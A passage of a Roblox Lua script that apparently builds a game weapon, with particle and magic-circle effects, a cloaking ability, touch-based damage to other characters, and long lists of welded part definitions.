	local prt=paart(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
	prt.Anchored=false
	prt.CFrame=cframe
	msh=mesh("BlockMesh",prt,"","",vt(0,0,0),vt(x1,y1,z1))
	local wld=weld(prt,prt,Parent,euler(0,0,0)*cf(0,0,0))
	game:GetService("Debris"):AddItem(prt,5)
	coroutine.resume(coroutine.create(function(Part,Mesh,Weld) 
		for i=0,1,delay do
			wait()
			Weld.C0=euler(i*20,0,0)
			--Part.CFrame=Part.CFrame*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
			Part.Transparency=i
			Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
		end
		Part.Parent=nil
	end),prt,msh,wld)
end

function MagicCircle2(brickcolor,cframe,x1,y1,z1,x3,y3,z3,delay)
	local prt=paart(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
	prt.Anchored=true
	prt.CFrame=cframe
	local msh=mesh("CylinderMesh",prt,"","",vt(0,0,0),vt(x1,y1,z1))
	game:GetService("Debris"):AddItem(prt,2)
	coroutine.resume(coroutine.create(function(Part,Mesh) 
		for i=0,1,delay do
			wait()
			Part.CFrame=Part.CFrame
			Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
			local prt2=paart(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
			prt2.Anchored=true
			prt2.CFrame=cframe*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
			local msh2=mesh("SpecialMesh",prt2,"Sphere","",vt(0,0,0),vt(0.5,0.5,0.5))
			game:GetService("Debris"):AddItem(prt2,2)
			coroutine.resume(coroutine.create(function(Part,Mesh) 
				for i=0,1,0.1 do
					wait()
					Part.CFrame=Part.CFrame*cf(0,0.5,0)
				end
				Part.Parent=nil
			end),prt2,msh2)
		end
		for i=0,1,delay*2 do
			wait()
			Part.CFrame=Part.CFrame
			Mesh.Scale=vt((x1+x3)-(x1+x3)*i,(y1+y3)-(y1+y3)*i,(z1+z3)-(z1+z3)*i)
		end
	Part.Parent=nil
	end),prt,msh)
end

function MagicCircle(brickcolor,cframe,x1,y1,z1,x3,y3,z3,delay)
	local prt=paart(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
	prt.Anchored=true
	prt.CFrame=cframe
	local msh=mesh("SpecialMesh",prt,"Sphere","",vt(0,0,0),vt(x1,y1,z1))
	game:GetService("Debris"):AddItem(prt,2)
	coroutine.resume(coroutine.create(function(Part,Mesh) 
		for i=0,1,delay do
			wait()
			Part.CFrame=Part.CFrame
			Part.Transparency=i
			Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
		end
		Part.Parent=nil
	end),prt,msh)
end

function MagicRing(brickcolor,cframe,x1,y1,z1,x2,y2,z2,x3,y3,z3)
	local prt=paart(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
	prt.Anchored=true
	prt.CFrame=cframe*euler(x2,y2,z2)
	--"http://www.roblox.com/asset/?id=168892465"
	local msh=mesh("SpecialMesh",prt,"FileMesh","http://www.roblox.com/asset/?id=3270017",vt(0,0,0),vt(x1,y1,z1))
	game:GetService("Debris"):AddItem(prt,2)
	coroutine.resume(coroutine.create(function(Part,Mesh) 
		for i=0,1,0.03 do
			wait()
			Part.CFrame=Part.CFrame
			Part.Transparency=i
			Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
		end
		Part.Parent=nil
	end),prt,msh)
end

function BreakEffect(brickcolor,cframe,x1,y1,z1)
	local prt=paart(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
	prt.Anchored=true
	prt.CFrame=cframe*euler(math.random(-50,50),math.random(-50,50),math.random(-50,50))
	local msh=mesh("SpecialMesh",prt,"Sphere","",vt(0,0,0),vt(x1,y1,z1))
	game:GetService("Debris"):AddItem(prt,2)
	coroutine.resume(coroutine.create(function(Part,CF,Numbb,randnumb) 
		CF=Part.CFrame
		Numbb=0
		randnumb=math.random()/10
		rand1=math.random()/10
		for i=0,1,rand1 do
			wait()
			CF=CF*cf(0,math.random()/2,0)
			--Part.CFrame=Part.CFrame*euler(0.5,0,0)*cf(0,1,0)
			Part.CFrame=CF*euler(Numbb,0,0)
			Part.Transparency=i
			Numbb=Numbb+randnumb
		end
		Part.Parent=nil
	end),prt,CF,Numbb,randnumb)
end

function MagicWaveThing(brickcolor,cframe,x1,y1,z1,x3,y3,z3,delay)
	local prt=paart(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
	prt.Anchored=true
	prt.CFrame=cframe
	msh=mesh("SpecialMesh",prt,"FileMesh","http://www.roblox.com/asset/?id=1051557",vt(0,0,0),vt(x1,y1,z1))
	game:GetService("Debris"):AddItem(prt,5)
	coroutine.resume(coroutine.create(function(Part,Mesh) 
		for i=0,1,delay do
			wait()
			Part.CFrame=Part.CFrame*euler(0,0.7,0)
			Part.Transparency=i
			Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
		end
		Part.Parent=nil
	end),prt,msh)
end

function WaveEffect(brickcolor,cframe,x1,y1,z1,x3,y3,z3,delay)
	local prt=paart(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
	prt.Anchored=true
	prt.CFrame=cframe
	msh=mesh("SpecialMesh",prt,"FileMesh","http://www.roblox.com/asset/?id=20329976",vt(0,0,0),vt(x1,y1,z1))
	game:GetService("Debris"):AddItem(prt,2)
	coroutine.resume(coroutine.create(function(Part,Mesh) 
		for i=0,1,delay do
			wait()
			Part.CFrame=Part.CFrame*cf(0,y3/2,0)
			Part.Transparency=i
			Mesh.Scale=Mesh.Scale+vt(x3,y3,z3)
		end
		Part.Parent=nil
	end),prt,msh)
end

function StravEffect(brickcolor,cframe,x,y,z,x1,y1,z1,delay)
	local prt=paart(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
	prt.Anchored=true
	prt.CFrame=cframe*cf(x,y,z)
	msh=mesh("SpecialMesh",prt,"FileMesh","rbxassetid://168892363",vt(0,0,0),vt(x1,y1,z1))
	game:GetService("Debris"):AddItem(prt,5)
	coroutine.resume(coroutine.create(function(Part,Mesh,ex,why,zee) 
		local num=math.random()
		local num2=math.random(-3,2)+math.random()
		local numm=0
		for i=0,1,delay*2 do
			swait()
			Part.CFrame=cframe*euler(0,numm*num*10,0)*cf(ex,why,zee)*cf(-i*10,num2,0)
			Part.Transparency=i
			numm=numm+0.01
		end
		Part.Parent=nil
		Mesh.Parent=nil
	end),prt,msh,x,y,z)
end

function dmgstart(dmg,what)
	hitcon = what.Touched:connect(function(hit)
		local hum = hit.Parent:FindFirstChild("Humanoid")
		if hum and not hum:IsDescendantOf(Character) then
			hum:TakeDamage(dmg)
		end
	end)
end

function dmgstop()
	hitcon:disconnect()
end

function Cloak()
	so("http://roblox.com/asset/?id=2767090",Torso,1,1.1) 
	Face.Parent=nil
	cloaked=true
	for _,v in pairs(Torso.Parent:children()) do
		if v.className=="Part" and v.Name~="HumanoidRootPart" then
			coroutine.resume(coroutine.create(function() 
				for i=0,1,0.2 do
					wait()
					v.Transparency=i
				end
				v.Transparency=1
			end))
		end
		if v.className=="Hat" then
			hatp=v.Handle
			coroutine.resume(coroutine.create(function(derp) 
				for i=0,1,0.2 do
					wait()
					derp.Transparency=i
				end
				derp.Transparency=1
			end),hatp)
		end
	end
	for _,v in pairs(m:children()) do
		if v.className=="Part" then
			coroutine.resume(coroutine.create(function() 
				for i=0,1,0.2 do
					wait()
					v.Transparency=i
				end
				v.Transparency=1
			end))
		end
	end
end

function UnCloak()
	so("http://roblox.com/asset/?id=2767090",Torso,1,1.1) 
	Face.Parent=Head 
	cloaked=false
	for _,v in pairs(Torso.Parent:children()) do
		if v.className=="Part" and v.Name~="HumanoidRootPart" then
			coroutine.resume(coroutine.create(function() 
				for i=0,1,0.1 do
					wait()
					v.Transparency=v.Transparency-0.1
				end
				v.Transparency=0
			end))
		end
		if v.className=="Hat" then
			hatp=v.Handle
			coroutine.resume(coroutine.create(function(derp) 
				for i=0,1,0.1 do
					wait()
					derp.Transparency=derp.Transparency-0.1
				end
				derp.Transparency=0
			end),hatp)
		end
	end
	for _,v in pairs(m:children()) do
		if v.className=="Part" and v.Name~="hitbox" and v.Name~='tip' then
			coroutine.resume(coroutine.create(function() 
				for i=0,1,0.1 do
					wait()
					v.Transparency=v.Transparency-0.1
				end
				v.Transparency=0
			end))
			v.Transparency=0
		end
	end
end
handle=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Handle",Vector3.new(1.4000001, 0.200000003, 0.200000003))
handleweld=weld(m,Character["Right Arm"],handle,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.0154070854, 0.995601535, 0.000632286072, -0.00125485484, 0.00257133436, -0.999995947, 6.88316641e-006, 0.999996662, 0.00257132808, 0.999999285, -3.6564943e-006, -0.00125486846))
HitboxA=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","HitboxA",Vector3.new(1.79999995, 2.4000001, 0.200000003))
HitboxAweld=weld(m,handle,HitboxA,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00170946121, -0.0965684652, -0.601927757, 0.999999881, -0.000561807537, 0.000275471248, 0.000561808934, 0.99999994, -4.76328069e-006, -0.000275468454, 4.91804258e-006, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(0.200000003, 0.800000072, 0.50999999))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.602468491, -0.724547029, 0.242210865, 0.00042680779, -7.82173265e-006, -0.99999994, -0.000832682126, -0.999999821, 7.46633577e-006, -0.999999583, 0.000832678634, -0.000426814135))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.120000005, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(0.200000003, 1.60000002, 0.600000024))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.60279274, 0.495191097, 0.799488068, -0.00070699479, 4.96798862e-007, 0.999999881, -0.00145373261, -0.999999046, -5.30982788e-007, 0.999998748, -0.00145373226, 0.000706994964))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.120000005, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(0.200000003, 0.800000072, 0.49999997))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.602442741, -0.724509835, 0.25446558, -0.000412500987, 7.36253105e-006, 1, -0.000830772333, -0.999999821, 7.01983481e-006, 0.999999642, -0.000830769422, 0.000412507041))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.120000005, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(0.200000003, 0.600000024, 0.600000024))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.601718903, -1.59704423, 0.801092148, -0.000494460051, 6.93902348e-006, 0.99999994, 0.00101020024, 0.999999523, -6.43951716e-006, -0.999999404, 0.00101019721, -0.000494466804))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.120000005, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(0.200000003, 0.600000024, 0.600000024))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.60227108, -1.59592354, 0.798442364, 0.000617224199, -4.80521385e-006, -1, 0.00125885615, 0.999999344, -4.02821388e-006, 0.999999046, -0.00125885336, 0.000617229904))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.120000005, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(1, 0.600000024, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00190782547, 0.0232970715, -0.601828575, 0.999999642, 0.000794240739, -0.000389426365, -0.000794241205, 0.999999821, -3.51965855e-006, 0.000389423221, 3.82895541e-006, 1))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.180000007))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(0.200000003, 1.60000002, 0.600000024))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.601143837, 0.498566628, 0.79928875, 0.000771298422, 6.43939802e-006, -0.999999762, -0.00161833921, -0.999998748, -7.68761493e-006, -0.99999845, 0.00161834504, -0.000771286897))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.120000005, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(1, 1.60000002, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00112390518, -1.09656513, -0.601929665, 0.999999881, -0.000561807537, 0.000275471248, 0.000561808934, 0.99999994, -4.76328069e-006, -0.000275468454, 4.91804258e-006, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(1, 0.200000003, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.000888347626, -1.19647253, -0.611891747, 0.999999583, -0.000899368082, 0.000440986711, 0.000899370061, 0.999999762, -4.0586242e-006, -0.000440982811, 4.4552321e-006, 0.99999994))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 1.60000002, 0.600000024))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.600500584, -1.09640467, -0.201779366, 1.00000012, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(1, 0.200000003, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.000306129456, -0.377037048, -0.601670265, 1, 0.000316517428, -0.000155193033, -0.000316518126, 1.00000012, -4.67931477e-006, 0.000155191519, 4.72843612e-006, 1.00000012))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.180000007))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.600498676, -0.196920753, -0.00151443481, 1.00000012, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 1.60000002, 0.600000024))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.599460602, -1.09671295, -0.201775551, 1.00000012, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.600000024, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.603309631, 0.79431057, 0.1997962, 0.000441341603, 1.01966566e-006, -1.00000012, -0.00148041546, -0.999999166, -1.67311498e-006, -0.999998808, 0.00148036098, -0.000441342418))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.800000072, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.602658272, 0.895184875, 0.599769115, -0.000441067736, -1.06552829e-006, 0.999999821, -0.0014800647, -0.999999106, -1.78397886e-006, 0.999998987, -0.00148006517, 0.000441068551))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.800000072, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.603645325, 0.895176172, 0.598275185, 0.000440955686, -1.06465241e-005, -0.999999523, -0.00366260204, -0.999993503, 9.09692517e-006, -0.999993205, 0.00366259739, -0.000441015174))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.200000003, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.599495411, -0.200006366, -8.58306885e-006, 1.00000012, 0, 0, 0, 1.00000012, 0, 0, 0, 1.00000012))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 1, 0.400000036))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.602901459, 0.794560313, 0.699896336, 0.000277693267, -4.80270955e-006, -0.999999642, -0.000562646659, -0.999999702, 4.62737444e-006, -0.999999821, 0.000562646426, -0.000277680578))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.600000024, 0.400000036))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.601531029, -1.59454489, 0.704494476, 0.000275316415, -3.86594729e-006, -0.999999821, 0.00458068866, 0.999989569, -2.60450747e-006, 0.99998945, -0.0045806882, 0.000275375205))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 1, 0.400000036))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.601531982, 0.794553995, 0.703288555, -0.00027771492, 3.93844584e-006, 0.999999464, -0.00458001066, -0.999989331, 2.68568306e-006, 0.999989212, -0.00458000973, 0.000277744257))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.400000036, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.602655411, -1.49517691, 0.599338531, 0.000441020064, 1.03086927e-006, -1.00000012, 0.00148038764, 0.999999344, 1.68374265e-006, 0.999998987, -0.00148038741, 0.000441020762))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(0.200000003, 0.600000024, 0.400000036))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.60290432, -1.59455109, 0.701107025, -0.000275433296, 4.86323188e-006, 0.99999994, 0.000561969588, 0.99999994, -4.70864506e-006, -0.999999821, 0.000561968423, -0.000275420258))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.600000083, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.602983475, 0.794746637, 0.200195313, -0.000441403419, -1.05526942e-006, 0.99999994, -0.00148058624, -0.999999166, -1.70904195e-006, 0.99999851, -0.00148053118, 0.000441275013))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.400000036, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.603649139, -1.49516821, 0.597844124, -0.000440896314, 1.06115904e-005, 0.999999702, 0.00366227981, 0.999993742, -8.99657334e-006, -0.999993205, 0.00366227515, -0.000441015174))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.600000024, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.602816582, -1.59496272, 0.399340153, 0.000441020064, 1.03086927e-006, -1.00000012, 0.00148038764, 0.999999344, 1.68374265e-006, 0.999998987, -0.00148038741, 0.000441020762))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(0.200000003, 0.600000024, 0.200000003))
Partweld=weld(m,handle,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.603467941, -1.59409034, 0.400663376, -0.000440896198, -9.23162133e-007, 0.999999762, 0.00148090243, 0.999999344, 1.57590046e-006, -0.999998569, 0.00148090185, -0.000440932345))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(1, 1, 1))


handle2=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","handle2",Vector3.new(1.4000001, 0.200000003, 0.200000003))
handle2weld=weld(m,Character["Left Arm"],handle2,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00919055939, 0.995664835, 0.0114703178, 0.0012549758, 0.00257122959, 0.999995947, -6.8526133e-006, 0.999996662, -0.00257122354, -0.999999046, -3.62611718e-006, 0.00125494599))
HitboxB=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,1,"Really black","HitboxB",Vector3.new(1.79999995, 2.4000001, 0.200000003))
HitboxBweld=weld(m,handle2,HitboxB,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.00170660019, -0.0965681076, -0.601927757, 0.999999642, -0.000561807072, 0.00027549779, 0.000561809167, 0.99999994, -4.76324203e-006, -0.00027543481, 4.91759874e-006, 0.999999702))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(0.200000003, 0.800000072, 0.50999999))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.602469921, -0.724547267, 0.242210865, 0.000426779152, -7.82130155e-006, -0.999999642, -0.000832682359, -0.999999821, 7.46649903e-006, -0.999999344, 0.000832678168, -0.000426910236))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.120000005, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(0.200000003, 1.60000002, 0.600000024))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.60279417, 0.495191097, 0.799487114, -0.000707134255, 4.96800908e-007, 0.999999523, -0.00145373296, -0.999999046, -5.30899797e-007, 0.999998569, -0.00145373214, 0.000706980878))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.120000005, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(0.200000003, 0.800000072, 0.49999997))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.602442265, -0.724509716, 0.254464626, -0.000412504945, 7.36218499e-006, 0.999999702, -0.000830772566, -0.999999821, 7.01985255e-006, 0.999999464, -0.00083076919, 0.000412620022))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.120000005, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(0.200000003, 0.600000024, 0.600000024))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.601716995, -1.59704447, 0.801092625, -0.000494611624, 6.93905622e-006, 0.999999583, 0.00101020071, 0.999999523, -6.43967132e-006, -0.999999344, 0.00101019721, -0.000494443404))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.120000005, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(0.200000003, 0.600000024, 0.600000024))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.602270603, -1.59592342, 0.79843998, 0.000617268961, -4.80497238e-006, -0.999999583, 0.00125885627, 0.999999344, -4.028072e-006, 0.999998927, -0.00125885347, 0.000617334503))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.120000005, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(1, 0.600000024, 0.200000003))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.0019068718, 0.0232973099, -0.601829529, 0.999999523, 0.000794241205, -0.000389327412, -0.000794240274, 0.999999821, -3.51985841e-006, 0.000389305991, 3.82890084e-006, 0.999999762))
mesh("BlockMesh",Part,"","",Vector3.new(0, 0, 0),Vector3.new(1, 1, 0.180000007))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0.5,"Toothpaste","Part",Vector3.new(0.200000003, 1.60000002, 0.600000024))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(0.601144314, 0.498567104, 0.799289227, 0.000771435793, 6.4394012e-006, -0.999999285, -0.00161833968, -0.999998748, -7.68757309e-006, -0.999998271, 0.0016183448, -0.000771280145))
mesh("SpecialMesh",Part,Enum.MeshType.Wedge,"",Vector3.new(0, 0, 0),Vector3.new(0.120000005, 1, 1))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Really black","Part",Vector3.new(1, 1.60000002, 0.200000003))
Partweld=weld(m,handle2,Part,CFrame.new(0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1),CFrame.new(-0.00112533569, -1.09656477, -0.601927757, 0.999999642, -0.000561807072, 0.00027549779, 0.000561809167, 0.99999994, -4.76324203e-006, -0.00027543481, 4.91759874e-006, 0.999999702))
Part=part(Enum.FormFactor.Custom,m,Enum.Material.SmoothPlastic,0,0,"Cyan","Part",Vector3.new(1, 0.200000003, 0.200000003))
